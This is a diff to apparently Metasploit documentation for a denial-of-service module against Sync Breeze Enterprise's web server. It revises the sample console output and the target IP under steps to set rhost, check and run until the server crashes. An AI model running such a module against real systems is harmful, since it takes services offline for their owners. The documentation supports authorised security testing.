@@ -29,9 +29,7 @@ Check the box saying: ```Enable web server on port:...```
   5. Do: `set rhost <ip>`
   6. Do: `check`
 ```
-[*] 192.168.1.27:80 - Checking connection to 192.168.1.27:80
-[+] 192.168.1.27:80 - Sync Breeze Enterprise v10.6.24 verified.
-[+] 192.168.1.27:80 The target is vulnerable.
+[+] 192.168.1.20:80 The target is vulnerable.
 ```
   7. Do: `run`
   8. Web server will crash after 200-1000 request depending on the OS version and system memory.
@@ -46,18 +44,9 @@ msf5 auxiliary(dos/http/syncbreeze_enterprise_dos) > set rport 80
 rport => 80
 msf5 auxiliary(dos/http/syncbreeze_enterprise_dos) > run
 
-[*] 192.168.1.27:80 - Checking connection to 192.168.1.27:80
-[+] 192.168.1.27:80 - Sync Breeze Enterprise v10.6.24 verified.
-[*] 192.168.1.27:80 - Sending HTTP DoS packets...
-[*] 192.168.1.27:80 - Request size: (6667) byte
-[*] 192.168.1.27:80 - Request size: (13990) byte
-[*] 192.168.1.27:80 - Request size: (15797) byte
-[*] 192.168.1.27:80 - Request size: (20369) byte
-[*] 192.168.1.27:80 - Request size: (11119) byte
-[*] 192.168.1.27:80 - Request size: (16293) byte
-[*] 192.168.1.27:80 - Request size: (13830) byte
-...
-[+] 192.168.1.27:80 - DoS successful 192.168.1.27 is down !
+[*] 192.168.1.20:80 - Triggering the vulnerability
+[-] 192.168.1.20:80 - Connection reset !
+[+] 192.168.1.20:80 - DoS successful 192.168.1.20 is down !
 [*] Auxiliary module execution completed
 
 ```
